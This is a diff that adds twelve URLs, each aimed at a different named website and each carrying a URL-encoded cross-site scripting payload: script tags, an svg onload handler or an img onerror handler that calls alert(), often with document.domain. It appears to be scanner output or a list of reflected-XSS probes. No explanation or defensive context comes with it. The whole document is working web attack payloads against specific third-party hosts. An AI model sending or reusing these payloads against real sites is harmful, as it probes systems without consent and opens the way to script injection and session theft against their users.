@@ -1,0 +1,12 @@
+http://ryleemacdonald.com/Ajax_url_encode.php?link_url=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://ryma.yunhu78.com/lostpassword.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+http://rymerlake.lopressure.com/OA_HTML/jtfLOVInProcess.jsp%3FAAA%3DAAAAAAAAAA%27%22%3E%3Csvg%2Fonload%3Dalert('2RZlBNEbWzWPIegFnh5ZsM7255j')%3E
+http://rynashley.com/admin/histograms?fmt=plot_cdf&h=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&log_scale=true
+http://ryn.cppprog.com/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+http://ryn.hhhh99.com/does_not_exist%22%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Cimg%20src=x
+http://ryobipresses.com/calendar_form.php/%22%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+http://ryo-cigarettes.com/does_not_exist%22%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Cimg%20src=x
+http://ryokkouen.com/admin/histograms?fmt=plot_cdf&h=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E&log_scale=true
+http://ryos6.whqcys.com/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+https://ryleemartin.cambabeguide.com/does_not_exist%22%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Cimg%20src=x
+https://ryleethomson.cambabeguide.com?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
